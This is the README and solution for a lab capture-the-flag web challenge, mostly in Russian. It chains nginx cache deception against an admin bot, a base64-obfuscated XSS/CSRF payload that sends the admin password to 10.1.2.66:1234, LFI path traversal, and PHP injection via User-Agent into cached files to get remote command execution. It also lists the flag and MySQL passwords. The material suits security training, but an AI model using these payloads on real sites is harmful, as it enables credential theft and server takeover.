## Task text:

Мы вышли на хакеров, которые многократно атаковали наши ресурсы во время нашей предвыборной компании. Ваша задача взломать их сайт и узнать кто они и на кого работают.

Вот их сайт: http://...

## How to run docker container:

1. Create image

    ```
    docker build --tag=web500 --no-cache .
    ```

2. Run docker image

    ```
    docker run -p 8080:8080 -p 80:80 web500
    ```

3. Edit /etc/hosts

    ```
    $SERVER_IP$	timehackers.ctf
    ```

   Where **$SERVER_IP$** - IP of your host server. 

## Flag:

flag:

```
ctfzone{b3_c@R3fuL_w17h_C@cH1ng}
```

## Credentials:

mysql:

```
root 	- n1Yq3IOz7nq2
web 	- N8zu3Qt2w5Vh
checker - yB2z51jw2qU5
```

## Solution:

1. С помощью баги в кэширование nginx хакер отправляет ссылку боту, которую тот открывает. Тем самым, хакер получает внутренний вид страницы админки. Пример ссылки боту:

    ``` 
    http://timehackers.ctf/admin.php/pwn.js
    ```

    После того, как авторизованный бот перейдет по этой ссылке, внешний вид страницы закешируется и мы сможем увидеть то, что видел бот.

2. На странице присутствует форма поиска пользователей и показа по ним информации. В ней XSS (логин не найден). Среди информации, которая показывается есть логин и пароль (пароль звёздочками). Чтобы увидеть пароль, нужно на него нажать. Тогда будет отправлен AJAX запрос в api и результат подставится в форму. Запрос шлётся с CSRF токеном, который генерируется при каждом запуске странице. Хакер должен отправить запрос с XSS, который украдёт CSRF токен, отправит AJAX запрос на получение пароля админа и  вернёт его хакеру. Таким образом хакер получит доступ в админку.

    Вектор имеет вид:

    ```javascript
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://timehackers.ctf/admin.php', false);
    xhr.send();
    csrf_token = /csrf_token = "(.+)";/.exec(xhr.responseText)[1];

   var xhr2 = new XMLHttpRequest();
   xhr2.open('POST', 'http://timehackers.ctf/api.php', false);
   var params = "token=" + csrf_token + "&action=get_password&username=admin";
   xhr2.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
   xhr2.send(params);

   img=new Image();
   img.src="http://10.1.2.66:1234/"+xhr2.responseText;
   ```

   Кодируем в base64:

   ```javascript
   eval(atob('dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbignR0VUJywgJ2h0dHA6Ly90aW1laGFja2Vycy5jdGYvYWRtaW4ucGhwJywgZmFsc2UpOwp4aHIuc2VuZCgpOwpjc3JmX3Rva2VuID0gL2NzcmZfdG9rZW4gPSAiKC4rKSI7Ly5leGVjKHhoci5yZXNwb25zZVRleHQpWzFdOwoKdmFyIHhocjIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyMi5vcGVuKCdQT1NUJywgJ2h0dHA6Ly90aW1laGFja2Vycy5jdGYvYXBpLnBocCcsIGZhbHNlKTsKdmFyIHBhcmFtcyA9ICJ0b2tlbj0iICsgY3NyZl90b2tlbiArICImYWN0aW9uPWdldF9wYXNzd29yZCZ1c2VybmFtZT1hZG1pbiI7CnhocjIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp4aHIyLnNlbmQocGFyYW1zKTsKCmltZz1uZXcgSW1hZ2UoKTsKaW1nLnNyYz0iaHR0cDovLzEwLjEuMi42NjoxMjM0LyIreGhyMi5yZXNwb25zZVRleHQ7'))
   ```

   CSRF страница, ссылку на которую надо скинуть боту:

   ```javascript
   <form method=post action="http://timehackers.ctf/api.php" name="xss">
     <input type=hidden name="token" value="<svg onload=eval(atob('dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbignR0VUJywgJ2h0dHA6Ly90aW1laGFja2Vycy5jdGYvYWRtaW4ucGhwJywgZmFsc2UpOwp4aHIuc2VuZCgpOwpjc3JmX3Rva2VuID0gL2NzcmZfdG9rZW4gPSAiKC4rKSI7Ly5leGVjKHhoci5yZXNwb25zZVRleHQpWzFdOwoKdmFyIHhocjIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyMi5vcGVuKCdQT1NUJywgJ2h0dHA6Ly90aW1laGFja2Vycy5jdGYvYXBpLnBocCcsIGZhbHNlKTsKdmFyIHBhcmFtcyA9ICJ0b2tlbj0iICsgY3NyZl90b2tlbiArICImYWN0aW9uPWdldF9wYXNzd29yZCZ1c2VybmFtZT1hZG1pbiI7CnhocjIuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpOwp4aHIyLnNlbmQocGFyYW1zKTsKCmltZz1uZXcgSW1hZ2UoKTsKaW1nLnNyYz0iaHR0cDovLzEwLjEuMi42NjoxMjM0LyIreGhyMi5yZXNwb25zZVRleHQ7'))>">
     <input type=hidden name="action" value='get_password'>
     <input type=hidden name="username" value='admin'>
   </form><body onload="document.xss.submit()">
   ```

3. В админке присутствует LFI уязвимость. 

   Пример запроса:

   ```HTTP
   GET /admin.php?p=../../../../../../../../../../etc/passwd HTTP/1.1
   Host: timehackers.ctf
   Cookie: PHPSESSID=mmdecpvo9qnb331a5e49l2uao7
   ```

   UserAgent отображается на странице и никак не экранируется. С помощью него в содержимое страницы помещается PHP пейлоад, который кэшируется nginx`ом. UserAgent устанавливается при авторизации и сохраняется для всей сессии. Далее с помощью LFI читается содержимое **/etc/nginx/nginx.conf**. Оттуда узнаётся имя и формат кэша. 

   ```
   proxy_cache_path /var/lib/nginx/cache levels=1:2 keys_zone=backcache:8m max_size=50m;
   proxy_cache_key "$host$request_uri";
   ```

   Например, если кэшируется страница http://timehackers.ctf/index.php/phpinfo.js, то имя файла будет md5("timehackers.ctf/index.php/phpinfo.js"). md5 получится **d9e1bc84776e2c1d7c2b233bc93c6a0c** Файл хранится в **/var/lib/nginx/cache/c/a0/**. Последние 2 директории, это последний и 2 предпоследних символа хэша. Таким образом можно узнать путь к полученному файлу, что даст RCE на сервере. Конечный запрос имеет вид:

   ```
   http://timehackers.ctf/admin.php?p=../../../../../../../var/lib/nginx/cache/c/a0/d9e1bc84776e2c1d7c2b233bc93c6a0c
   ```

   Льем eval шелл по пути http://timehackers.ctf/index.php/eval.css

   И далее выполняем любые команды на сервере следующим HTTP GET запросом:

   ```
   http://timehackers.ctf/admin.php?p=../../../../../../../var/lib/nginx/cache/4/37/f8e89b38709f9ab66530346d2267a374&cmd=system('uname%20-a');
   ```

   Ищем директорию:

   ```
   system('ls%20/flag');
   ```

   Читаем флаг

   ```
   system('cat%20/flag/Th3_M0sT_S3cR3T_fL@g_2448');
   ```